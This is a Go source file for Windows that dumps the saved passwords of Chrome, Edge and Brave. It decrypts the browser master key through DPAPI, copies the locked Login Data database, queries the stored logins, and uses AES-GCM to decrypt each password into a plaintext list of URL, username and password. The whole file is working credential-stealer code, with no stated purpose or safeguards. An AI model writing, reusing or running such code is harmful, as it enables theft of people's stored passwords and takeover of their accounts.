package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var (
	dllcrypt32        = syscall.NewLazyDLL("crypt32.dll")
	procUnprotectData = dllcrypt32.NewProc("CryptUnprotectData")
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		cbData: uint32(len(d)),
		pbData: &d[0],
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, unsafe.Slice(b.pbData, b.cbData))
	return d
}

// Wrapper for CryptUnprotectData
func DecryptDPAPI(data []byte) ([]byte, error) {
	var outBlob DATA_BLOB
	blobIn := NewBlob(data)

	r, _, err := procUnprotectData.Call(
		uintptr(unsafe.Pointer(blobIn)),
		0, 0, 0, 0,
		0x1, // CRYPTPROTECT_UI_FORBIDDEN
		uintptr(unsafe.Pointer(&outBlob)),
	)
	if r == 0 {
		return nil, err
	}
	defer syscall.LocalFree(syscall.Handle(unsafe.Pointer(outBlob.pbData)))
	return outBlob.ToByteArray(), nil
}

func GetMasterKey(localStatePath string) ([]byte, error) {
	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return nil, err
	}
	defer jsonFile.Close()

	byteValue, _ := io.ReadAll(jsonFile)
	var result map[string]interface{}
	json.Unmarshal(byteValue, &result)

	osCrypt, ok := result["os_crypt"].(map[string]interface{})
	if !ok {
		return nil, fmt.Errorf("os_crypt not found")
	}
	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil, fmt.Errorf("encrypted_key not found")
	}
	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("base64 decode failed: %v", err)
	}

	if len(encryptedKey) < 5 {
		return nil, fmt.Errorf("key too short")
	}
	encryptedKey = encryptedKey[5:]

	return DecryptDPAPI(encryptedKey)
}

func DecryptPassword(ciphertext []byte, key []byte) (string, error) {
	if len(ciphertext) < 15 {
		return "", fmt.Errorf("ciphertext too short")
	}

	nonce := ciphertext[3:15]
	encryptedPass := ciphertext[15 : len(ciphertext)-16]

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	plaintext, err := aesgcm.Open(nil, nonce, encryptedPass, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func DumpBrowsers() string {
	var sb strings.Builder

	localAppData := os.Getenv("LOCALAPPDATA")
	chromePath := filepath.Join(localAppData, "Google", "Chrome", "User Data")
	if _, err := os.Stat(chromePath); err == nil {
		sb.WriteString("=== Google Chrome ===\n")
		sb.WriteString(DumpBrowser(chromePath))
		sb.WriteString("\n")
	}

	edgePath := filepath.Join(localAppData, "Microsoft", "Edge", "User Data")
	if _, err := os.Stat(edgePath); err == nil {
		sb.WriteString("=== Microsoft Edge ===\n")
		sb.WriteString(DumpBrowser(edgePath))
		sb.WriteString("\n")
	}

	bravePath := filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data")
	if _, err := os.Stat(bravePath); err == nil {
		sb.WriteString("=== Brave Browser ===\n")
		sb.WriteString(DumpBrowser(bravePath))
		sb.WriteString("\n")
	}

	if sb.Len() == 0 {
		return "No supported browsers found or no data."
	}

	return sb.String()
}

func DumpBrowser(userDataPath string) string {
	var sb strings.Builder

	localState := filepath.Join(userDataPath, "Local State")
	masterKey, err := GetMasterKey(localState)
	if err != nil {
		return fmt.Sprintf("Error getting master key: %v\n", err)
	}

	loginData := filepath.Join(userDataPath, "Default", "Login Data")
	if _, err := os.Stat(loginData); os.IsNotExist(err) {
		return "Login Data not found in Default profile\n"
	}

	// Copy DB to temp to bypass lock
	tempLoginData := filepath.Join(os.TempDir(), fmt.Sprintf("LoginData_%d.db", syscall.Getpid()))
	err = CopyFile(loginData, tempLoginData)
	if err != nil {
		return fmt.Sprintf("Error copying DB: %v\n", err)
	}
	defer os.Remove(tempLoginData)

	db, err := sql.Open("sqlite3", tempLoginData)
	if err != nil {
		return fmt.Sprintf("Error opening DB: %v\n", err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return fmt.Sprintf("Error querying DB: %v\n", err)
	}
	defer rows.Close()

	count := 0
	for rows.Next() {
		var url, username string
		var encryptedPass []byte
		err = rows.Scan(&url, &username, &encryptedPass)
		if err != nil {
			continue
		}

		sb.WriteString(fmt.Sprintf("URL: %s\nUser: %s\n", url, username))

		if len(encryptedPass) > 0 {
			decrypted, err := DecryptPassword(encryptedPass, masterKey)
			if err == nil && len(decrypted) > 0 {
				sb.WriteString(fmt.Sprintf("Pass: %s\n", decrypted))
			} else {
				prefix := "Unknown"
				if len(encryptedPass) >= 3 {
					prefix = string(encryptedPass[:3])
				}
				sb.WriteString(fmt.Sprintf("Pass: [Encrypted/Failed] Prefix: %s | Error: %v\n", prefix, err))
			}
		} else {
			sb.WriteString("Pass: [Empty]\n")
		}
		sb.WriteString("\n")
		count++
	}

	if count == 0 {
		return "No logins found in DB.\n"
	}

	return sb.String()
}

func CopyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}
